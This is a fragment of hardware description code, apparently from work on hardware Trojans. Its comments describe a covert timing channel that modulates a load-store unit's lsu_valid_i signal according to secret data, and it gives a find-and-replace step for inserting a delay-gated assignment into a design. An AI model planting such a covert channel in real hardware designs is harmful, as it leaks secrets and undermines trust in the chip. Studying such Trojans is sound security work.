 ...
 * Payload: Modulate timing of lsu_valid_i based on secret data
 * 
...
assign secret_bit = lsu_valid_i[0];
...
// ============================================================
// Covert Channel: Modulate timing of lsu_valid_i
//
// Integration Script Must Modify:
//
// IF lsu_valid_i is timing-sensitive:
//   Find: assign lsu_valid_i = ready_signal;
//   Replace: assign lsu_valid_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
